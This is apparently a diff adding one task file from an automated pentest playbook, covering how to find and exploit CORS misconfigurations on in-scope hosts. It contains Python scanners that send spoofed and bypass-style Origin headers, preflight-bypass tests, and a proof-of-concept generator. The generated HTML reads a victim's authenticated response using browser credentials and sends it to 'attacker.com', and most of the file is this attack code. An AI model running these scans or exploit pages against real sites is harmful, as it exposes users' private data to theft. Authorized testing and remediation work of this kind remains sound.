@@ -1,0 +1,642 @@
+================================================================================
+TASK 93 - CORS MISCONFIGURATION
+================================================================================
+Covers testing_toolkit.txt Phase 15 Step 48
+Cross-Origin Resource Sharing (CORS) policy bypass
+
+CORS MISCONFIG = DATA THEFT VIA VICTIM'S BROWSER
+When CORS is misconfigured, attacker can:
+- Read sensitive data cross-origin
+- Perform actions as victim
+- Bypass SOP (Same-Origin Policy)
+
+================================================================================
+INPUTS
+================================================================================
+outputs/live_base_urls.txt                 <- Live hosts
+outputs/url_corpus_all_in_scope.txt        <- URL corpus
+outputs/har/accounts/*_auth.json           <- Auth tokens
+outputs/api_endpoints_from_openapi.txt     <- API endpoints
+
+================================================================================
+OUTPUTS
+================================================================================
+outputs/cors/
+    scan_results.txt                       <- All CORS test results
+    misconfigured_endpoints.txt            <- Vulnerable endpoints
+    reflection_vulnerable.txt              <- Origin reflection vulns
+    null_origin_vulnerable.txt             <- null origin accepted
+    wildcard_with_credentials.txt          <- * with credentials
+    subdomain_bypass.txt                   <- Subdomain trust issues
+
+outputs/vulnerabilities/CORS-MISCONFIGURATION-*-MEDIUM.md
+
+================================================================================
+🧠 AGENT DECISION FRAMEWORK
+================================================================================
+
+UNDERSTAND CORS MECHANICS:
+
+    What is CORS?
+    |
+    +-- Browser security mechanism
+    +-- Controls cross-origin requests
+    +-- Implemented via HTTP headers
+    +-- Server declares who can access
+
+    The vulnerable headers:
+    |
+    +-- Access-Control-Allow-Origin (ACAO)
+    |   +-- Which origins can access
+    |   +-- * = everyone (if no credentials)
+    |   +-- Specific origin = only that one
+    |   +-- VULN: reflects any origin!
+    |
+    +-- Access-Control-Allow-Credentials (ACAC)
+    |   +-- true = send cookies/auth
+    |   +-- VULN: true with reflected origin
+    |
+    +-- Access-Control-Allow-Methods (ACAM)
+    +-- Access-Control-Allow-Headers (ACAH)
+
+    Attack scenarios:
+    |
+    Request from evil.com:
+    Origin: evil.com
+    |
+    Vulnerable response:
+    Access-Control-Allow-Origin: evil.com     <- REFLECTED!
+    Access-Control-Allow-Credentials: true
+    |
+    IMPACT:
+    +-- evil.com can read response
+    +-- Cookie sent with request
+    +-- Read victim's private data!
+
+================================================================================
+PHASE 1: CORS BASELINE TESTING
+================================================================================
+
+-----------------------------------------
+1.1 Check CORS Headers
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+cors_scanner.py - Comprehensive CORS misconfiguration detection
+"""
+
+import requests
+import json
+import re
+import os
+from urllib.parse import urlparse
+
+os.makedirs('outputs/cors', exist_ok=True)
+os.makedirs('outputs/vulnerabilities', exist_ok=True)
+
+requests.packages.urllib3.disable_warnings()
+
+class CORSScanner:
+    
+    def __init__(self):
+        self.session = requests.Session()
+        self.results = []
+    
+    def test_cors(self, url, origin):
+        """Test CORS with specific origin"""
+        
+        headers = {'Origin': origin}
+        
+        try:
+            resp = self.session.get(
+                url,
+                headers=headers,
+                timeout=15,
+                verify=False
+            )
+            
+            acao = resp.headers.get('Access-Control-Allow-Origin', '')
+            acac = resp.headers.get('Access-Control-Allow-Credentials', '')
+            
+            return {
+                'url': url,
+                'origin_sent': origin,
+                'acao': acao,
+                'acac': acac,
+                'status': resp.status_code
+            }
+            
+        except:
+            return None
+    
+    def analyze_result(self, result):
+        """Analyze CORS response for vulnerabilities"""
+        
+        if not result:
+            return None
+        
+        vulns = []
+        origin = result['origin_sent']
+        acao = result['acao']
+        acac = result['acac'].lower()
+        
+        # 1. Origin reflection (most dangerous)
+        if acao == origin and acac == 'true':
+            vulns.append({
+                'type': 'origin_reflection_with_credentials',
+                'severity': 'HIGH',
+                'evidence': f'ACAO: {acao}, ACAC: {acac}'
+            })
+        
+        # 2. Origin reflection without credentials
+        elif acao == origin:
+            vulns.append({
+                'type': 'origin_reflection',
+                'severity': 'MEDIUM',
+                'evidence': f'ACAO: {acao}'
+            })
+        
+        # 3. null origin accepted
+        if acao == 'null':
+            if acac == 'true':
+                vulns.append({
+                    'type': 'null_origin_with_credentials',
+                    'severity': 'HIGH',
+                    'evidence': f'ACAO: null, ACAC: true'
+                })
+            else:
+                vulns.append({
+                    'type': 'null_origin',
+                    'severity': 'MEDIUM',
+                    'evidence': f'ACAO: null'
+                })
+        
+        # 4. Wildcard with credentials (browser blocks, but shows bad config)
+        if acao == '*' and acac == 'true':
+            vulns.append({
+                'type': 'wildcard_with_credentials',
+                'severity': 'INFO',
+                'evidence': 'Browser blocks this, but shows misconfiguration'
+            })
+        
+        return vulns
+
+-----------------------------------------
+1.2 Test Origin Variations
+-----------------------------------------
+def generate_origin_tests(target_domain):
+    """Generate various origin tests for bypass"""
+    
+    origins = [
+        # Basic evil domain
+        'https://evil.com',
+        'http://evil.com',
+        
+        # null origin (iframe, file://, etc.)
+        'null',
+        
+        # Subdomain of evil
+        f'https://{target_domain}.evil.com',
+        
+        # Prefix bypass
+        f'https://evil{target_domain}',
+        f'https://{target_domain}evil.com',
+        
+        # Suffix bypass
+        f'https://evil.com.{target_domain}',
+        f'https://{target_domain}.evil',
+        
+        # Regex bypass
+        f'https://{target_domain}@evil.com',
+        f'https://{target_domain}%60.evil.com',
+        f'https://{target_domain}_.evil.com',
+        
+        # Protocol confusion
+        f'http://{target_domain}',  # HTTP vs HTTPS
+        
+        # Subdomain trust
+        f'https://subdomain.{target_domain}',
+        f'https://test.{target_domain}',
+        f'https://admin.{target_domain}',
+        
+        # Double origin
+        f'https://evil.com https://{target_domain}',
+        
+        # Unicode bypass
+        f'https://evil。com',  # Full-width dot
+        
+        # Whitespace bypass
+        f' https://evil.com',
+        f'https://evil.com ',
+    ]
+    
+    return origins
+
+================================================================================
+PHASE 2: COMPREHENSIVE TESTING
+================================================================================
+
+-----------------------------------------
+2.1 Full CORS Audit
+-----------------------------------------
+#!/usr/bin/env python3
+"""
+cors_full_audit.py - Complete CORS misconfiguration audit
+"""
+
+def cors_full_audit(urls):
+    """Run full CORS audit on all URLs"""
+    
+    scanner = CORSScanner()
+    
+    for url in urls:
+        domain = urlparse(url).netloc
+        
+        # Generate origin tests
+        test_origins = generate_origin_tests(domain)
+        
+        for origin in test_origins:
+            result = scanner.test_cors(url, origin)
+            
+            if result:
+                vulns = scanner.analyze_result(result)
+                
+                if vulns:
+                    for v in vulns:
+                        scanner.results.append({
+                            'url': url,
+                            'origin': origin,
+                            'vulnerability': v
+                        })
+                        print(f"[+] {v['type']} at {url}")
+    
+    return scanner.results
+
+-----------------------------------------
+2.2 Specific Bypass Tests
+-----------------------------------------
+def test_cors_bypasses(url, target_domain):
+    """Test specific CORS bypass techniques"""
+    
+    session = requests.Session()
+    bypasses = []
+    
+    # 1. null origin via sandbox iframe
+    # Attack vector: <iframe sandbox="allow-scripts" src="data:text/html,...">
+    resp = session.get(url, headers={'Origin': 'null'}, verify=False)
+    if resp.headers.get('Access-Control-Allow-Origin') == 'null':
+        bypasses.append({
+            'type': 'null_origin_bypass',
+            'vector': '<iframe sandbox="allow-scripts" src="...">'
+        })
+    
+    # 2. Regex bypass - subdomain
+    evil_sub = f'https://{target_domain}.attacker.com'
+    resp = session.get(url, headers={'Origin': evil_sub}, verify=False)
+    if resp.headers.get('Access-Control-Allow-Origin') == evil_sub:
+        bypasses.append({
+            'type': 'subdomain_regex_bypass',
+            'vector': f'Register {target_domain}.attacker.com'
+        })
+    
+    # 3. Prefix bypass
+    evil_prefix = f'https://attacker{target_domain}.com'
+    resp = session.get(url, headers={'Origin': evil_prefix}, verify=False)
+    if resp.headers.get('Access-Control-Allow-Origin') == evil_prefix:
+        bypasses.append({
+            'type': 'prefix_bypass',
+            'vector': f'Register attacker{target_domain}.com'
+        })
+    
+    # 4. Protocol downgrade
+    http_origin = f'http://{target_domain}'
+    resp = session.get(url, headers={'Origin': http_origin}, verify=False)
+    if resp.headers.get('Access-Control-Allow-Origin') == http_origin:
+        bypasses.append({
+            'type': 'protocol_downgrade',
+            'vector': 'Use HTTP origin for HTTPS endpoint'
+        })
+    
+    return bypasses
+
+================================================================================
+PHASE 3: PREFLIGHT BYPASS
+================================================================================
+
+-----------------------------------------
+3.1 Simple vs Preflighted Requests
+-----------------------------------------
+"""
+SIMPLE REQUESTS (no preflight):
+- GET, HEAD, POST only
+- Content-Type: text/plain, multipart/form-data, application/x-www-form-urlencoded
+- Only simple headers
+
+PREFLIGHTED REQUESTS (OPTIONS first):
+- PUT, DELETE, PATCH
+- Custom headers (X-Custom)
+- Content-Type: application/json
+
+BYPASS:
+If target accepts simple requests, we might skip preflight!
+"""
+
+def test_preflight_bypass(url):
+    """Test if preflight can be bypassed"""
+    
+    session = requests.Session()
+    results = []
+    
+    # Test POST with text/plain (bypasses preflight for JSON endpoint)
+    evil_origin = 'https://evil.com'
+    
+    # Try POST with simple content-type
+    resp = session.post(
+        url,
+        data='{"test": "value"}',  # JSON as plain text
+        headers={
+            'Origin': evil_origin,
+            'Content-Type': 'text/plain'
+        },
+        verify=False
+    )
+    
+    acao = resp.headers.get('Access-Control-Allow-Origin')
+    
+    if acao == evil_origin or acao == '*':
+        results.append({
+            'type': 'preflight_bypass',
+            'method': 'POST text/plain',
+            'evidence': f'ACAO: {acao}'
+        })
+    
+    return results
+
+================================================================================
+PHASE 4: EXPLOIT GENERATION
+================================================================================
+
+-----------------------------------------
+4.1 CORS Exploit PoC
+-----------------------------------------
+def generate_cors_poc(vuln_url, vuln_type):
+    """Generate CORS exploit PoC"""
+    
+    if vuln_type == 'origin_reflection_with_credentials':
+        poc = f"""<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS PoC - Origin Reflection</title>
+</head>
+<body>
+    <h1>CORS Exploit</h1>
+    <div id="result"></div>
+    
+    <script>
+        var xhr = new XMLHttpRequest();
+        xhr.onreadystatechange = function() {{
+            if (xhr.readyState == 4) {{
+                document.getElementById('result').innerHTML = 
+                    '<pre>' + xhr.responseText + '</pre>';
+                
+                // Exfiltrate to attacker
+                new Image().src = 'https://attacker.com/log?' + 
+                    encodeURIComponent(xhr.responseText);
+            }}
+        }};
+        
+        xhr.open('GET', '{vuln_url}', true);
+        xhr.withCredentials = true;  // Send cookies!
+        xhr.send();
+    </script>
+</body>
+</html>"""
+        return poc
+    
+    elif vuln_type == 'null_origin':
+        poc = f"""<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS PoC - null Origin</title>
+</head>
+<body>
+    <h1>null Origin Exploit</h1>
+    <div id="result"></div>
+    
+    <!-- Sandboxed iframe generates null origin -->
+    <iframe sandbox="allow-scripts allow-forms" 
+            src="data:text/html,<script>
+        var xhr = new XMLHttpRequest();
+        xhr.onreadystatechange = function() {{
+            if (xhr.readyState == 4) {{
+                parent.postMessage(xhr.responseText, '*');
+            }}
+        }};
+        xhr.open('GET', '{vuln_url}', true);
+        xhr.withCredentials = true;
+        xhr.send();
+    </script>">
+    </iframe>
+    
+    <script>
+        window.addEventListener('message', function(e) {{
+            document.getElementById('result').innerHTML = 
+                '<pre>' + e.data + '</pre>';
+        }});
+    </script>
+</body>
+</html>"""
+        return poc
+    
+    return None
+
+================================================================================
+PHASE 5: FULL AUTOMATION SCRIPT
+================================================================================
+
+#!/usr/bin/env python3
+"""
+cors_complete.py - Complete CORS misconfiguration scanner
+"""
+
+import os
+import json
+import requests
+from urllib.parse import urlparse
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+os.makedirs('outputs/cors', exist_ok=True)
+os.makedirs('outputs/vulnerabilities', exist_ok=True)
+
+requests.packages.urllib3.disable_warnings()
+
+class CompleteCORSScanner:
+    
+    def __init__(self):
+        self.session = requests.Session()
+        self.vulnerable = []
+    
+    def scan_url(self, url):
+        """Scan single URL for CORS issues"""
+        
+        domain = urlparse(url).netloc
+        findings = []
+        
+        # Origins to test
+        origins = [
+            'https://evil.com',
+            'null',
+            f'https://{domain}.evil.com',
+            f'https://evil{domain}',
+            f'http://{domain}',
+        ]
+        
+        for origin in origins:
+            try:
+                headers = {'Origin': origin} if origin != 'null' else {'Origin': 'null'}
+                
+                resp = self.session.get(
+                    url,
+                    headers=headers,
+                    timeout=15,
+                    verify=False
+                )
+                
+                acao = resp.headers.get('Access-Control-Allow-Origin', '')
+                acac = resp.headers.get('Access-Control-Allow-Credentials', '').lower()
+                
+                # Check for vulnerable configurations
+                if acao == origin or acao == 'null':
+                    severity = 'HIGH' if acac == 'true' else 'MEDIUM'
+                    
+                    findings.append({
+                        'url': url,
+                        'origin': origin,
+                        'acao': acao,
+                        'acac': acac,
+                        'severity': severity
+                    })
+                    
+            except:
+                continue
+        
+        return findings
+    
+    def scan_all(self, urls, threads=10):
+        """Scan all URLs concurrently"""
+        
+        with ThreadPoolExecutor(max_workers=threads) as executor:
+            futures = {executor.submit(self.scan_url, url): url 
+                      for url in urls}
+            
+            for future in as_completed(futures):
+                try:
+                    findings = future.result()
+                    self.vulnerable.extend(findings)
+                except:
+                    pass
+    
+    def generate_reports(self):
+        """Generate vulnerability reports"""
+        
+        for i, vuln in enumerate(self.vulnerable):
+            report = f"""# CORS Misconfiguration
+
+**URL**: {vuln['url']}
+**Severity**: {vuln['severity']}
+
+## Details
+- **Origin Sent**: `{vuln['origin']}`
+- **Access-Control-Allow-Origin**: `{vuln['acao']}`
+- **Access-Control-Allow-Credentials**: `{vuln['acac']}`
+
+## Impact
+{'Attacker can read authenticated responses cross-origin!' if vuln['acac'] == 'true' 
+ else 'Attacker can read unauthenticated responses cross-origin.'}
+
+## PoC
+```html
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open('GET', '{vuln['url']}', true);
+xhr.withCredentials = {str(vuln['acac'] == 'true').lower()};
+xhr.onload = function() {{ 
+    console.log(xhr.responseText); 
+}};
+xhr.send();
+</script>
+```
+
+## Remediation
+1. Use explicit allowlist of trusted origins
+2. NEVER reflect the Origin header directly
+3. Avoid `Access-Control-Allow-Credentials: true` unless necessary
+4. Validate origin against strict pattern
+"""
+            
+            with open(f'outputs/vulnerabilities/CORS-{i}-{vuln["severity"]}.md', 'w') as f:
+                f.write(report)
+    
+    def save_results(self):
+        """Save all results"""
+        
+        # All findings
+        with open('outputs/cors/scan_results.txt', 'w') as f:
+            for v in self.vulnerable:
+                f.write(f"{v['severity']}|{v['url']}|{v['origin']}\n")
+        
+        # JSON format
+        with open('outputs/cors/findings.json', 'w') as f:
+            json.dump(self.vulnerable, f, indent=2)
+        
+        # Categorized outputs
+        reflection = [v for v in self.vulnerable 
+                     if v['origin'] not in ['null'] and v['acao'] == v['origin']]
+        null_vuln = [v for v in self.vulnerable if v['acao'] == 'null']
+        
+        with open('outputs/cors/reflection_vulnerable.txt', 'w') as f:
+            for v in reflection:
+                f.write(f"{v['url']}\n")
+        
+        with open('outputs/cors/null_origin_vulnerable.txt', 'w') as f:
+            for v in null_vuln:
+                f.write(f"{v['url']}\n")
+
+# Run
+if __name__ == "__main__":
+    # Load URLs
+    with open('outputs/url_corpus_all_in_scope.txt') as f:
+        urls = [l.strip() for l in f if l.strip()]
+    
+    # Add API endpoints
+    if os.path.exists('outputs/api_endpoints_from_openapi.txt'):
+        with open('outputs/api_endpoints_from_openapi.txt') as f:
+            urls += [l.strip() for l in f if l.strip()]
+    
+    urls = list(set(urls))
+    
+    print(f"[*] Scanning {len(urls)} URLs for CORS issues...")
+    
+    scanner = CompleteCORSScanner()
+    scanner.scan_all(urls)
+    scanner.save_results()
+    scanner.generate_reports()
+    
+    print(f"\n[*] CORS vulnerabilities found: {len(scanner.vulnerable)}")
+
+================================================================================
+SUMMARY CHECKLIST
+================================================================================
+
+[ ] Basic origin reflection tested
+[ ] null origin tested
+[ ] Subdomain/prefix/suffix bypasses tested
+[ ] Wildcard with credentials checked
+[ ] Preflight bypass tested
+[ ] High-severity vulns have PoC generated
+[ ] All findings documented
+
+================================================================================
+NEXT TASK
+================================================================================
+Task 94: Clickjacking (Phase 15 - Misc Advanced)
